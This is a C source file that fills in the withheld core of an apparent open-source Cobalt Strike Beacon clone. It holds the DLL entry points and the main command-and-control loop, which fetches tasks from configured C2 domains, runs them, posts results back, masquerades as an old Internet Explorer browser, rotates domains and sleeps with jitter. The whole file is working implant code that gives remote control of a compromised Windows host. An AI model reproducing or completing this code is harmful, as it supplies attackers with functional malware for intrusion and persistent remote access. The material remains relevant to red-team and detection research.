/* beacon.c - B-1 orchestrator glue for CobaltStrike_OpenBeacon.
 * The upstream repo ships every subsystem (protocol/task/network/crypto/
 * spawn/link/job/filesystem) but withholds this file: DllMain + the main
 * C2 loop + BeaconOutput/BeaconPrintf + the reply buffer.
 *
 * Loop (official shape): GET tasks (metadata rides the S_C2_REQUEST
 * transform) -> TaskProcess -> outputs accumulate in the network reply
 * buffer as [BE len][BE type][data] frames -> NetworkPost flushes via
 * S_C2_POSTREQ. */
#include "pch.h"

#include "beacon.h"

#include "settings.h"

#include "callback.h"
#include "identity.h"
#include "metadata.h"
#include "network.h"
#include "self.h"
#include "task.h"
#include "transform.h"
#include "utils.h"

#include <stdarg.h>

#define OB_MAX_GET   (1024 * 512)
#define OB_MAX_POST  (1024 * 1024)
#define OB_AGENT     "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"

/* network.c globals (non-static) - the reply buffer NetworkPost flushes */
extern int gPostBufferLength;
extern char* gPostBuffer;

static BOOL ob_started = FALSE;

static void ObReplyAppend(int type, const char* data, int length) {
	if (gPostBuffer == NULL || length < 0) return;
	if (gPostBufferLength + 8 + length > OB_MAX_POST) return;
	unsigned int net = htonl((unsigned long)type);
	memcpy(gPostBuffer + gPostBufferLength, &net, 4);
	net = htonl((unsigned long)length);
	memcpy(gPostBuffer + gPostBufferLength + 4, &net, 4);
	if (length > 0 && data != NULL)
		memcpy(gPostBuffer + gPostBufferLength + 8, data, length);
	gPostBufferLength += 8 + length;
}

void BeaconOutput(int type, const char* data, int length) {
	ObReplyAppend(type, data, length);
}

void BeaconPrintf(int type, char* fmt, ...) {
	char buf[4096];
	va_list args;
	va_start(args, fmt);
	int n = _vsnprintf_s(buf, sizeof(buf), _TRUNCATE, fmt, args);
	va_end(args);
	if (n < 0) n = (int)sizeof(buf) - 1;
	ObReplyAppend(type, buf, n);
}

void BeaconErrorD(int error, int value) {
	BeaconPrintf(CALLBACK_ERROR, "operation failed: %d", value);
}

void BeaconErrorDD(int error, int one, int two) {
	BeaconPrintf(CALLBACK_ERROR, "operation failed: %d %d", one, two);
}

void BeaconErrorNA(int error) {
	BeaconPrintf(CALLBACK_ERROR, "operation failed (no args)");
}

static DWORD WINAPI ObMain(LPVOID unused) {
	char* data = (char*)malloc(OB_MAX_GET);
	if (data == NULL)
		BeaconInterrupt();
	gPostBuffer = (char*)malloc(OB_MAX_POST);

	NetworkInit();

	char domains[256];
	strncpy(domains, S_DOMAINS, sizeof(domains) - 1);
	domains[sizeof(domains) - 1] = 0;
	char* saveptr = NULL;
	char* host = strtok_s(domains, ",", &saveptr);

	MetadataGenerate(NULL, 128);

	if (host != NULL)
		NetworkConfigureHttp(host, S_PORT_HTTP, OB_AGENT);

	STRATEGY strategy = { 0, 0, 0 };

	while (TRUE) {
		if (BeaconIsExpired())
			BeaconInterrupt();

		int n = NetworkGet(S_C2_REQUEST, &gSession, data, OB_MAX_GET);
		if (n < 0) {
			host = StrategyPickDomain(S_DOMAINS, TRUE, strategy);
			if (host != NULL)
				NetworkConfigureHttp(host, S_PORT_HTTP, OB_AGENT);
		}
		else if (n > 0) {
			TaskProcess(data, n);
		}

		NetworkPost(S_C2_POSTREQ);

		int sleepMs = gSleepTime;
		if (sleepMs > 0 && gJitter > 0) {
			int j = (int)((double)gSleepTime * (double)gJitter / 100.0);
			if (j > 0)
				sleepMs += (rand() % (2 * j)) - j;
		}
		if (sleepMs > 0)
			Sleep(sleepMs);
	}
	return 0;
}

static DWORD WINAPI ObStart(LPVOID unused) {
	if (!ob_started) {
		ob_started = TRUE;
		HANDLE h = CreateThread(NULL, 0, ObMain, NULL, 0, NULL);
		if (h) CloseHandle(h);
	}
	return 0;
}

/* entry: official loaders call DllMain(hModule, 4, lpReserved); our harness
 * may also call the exported BeaconEntry directly. */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
	switch (reason) {
		case DLL_PROCESS_ATTACH:
		case 4:
			ObStart(NULL);
			return TRUE;
		case DLL_PROCESS_DETACH:
		default:
			return TRUE;
	}
}

__declspec(dllexport) void __cdecl BeaconEntry(LPVOID lpReserved) {
	ObStart(NULL);
}
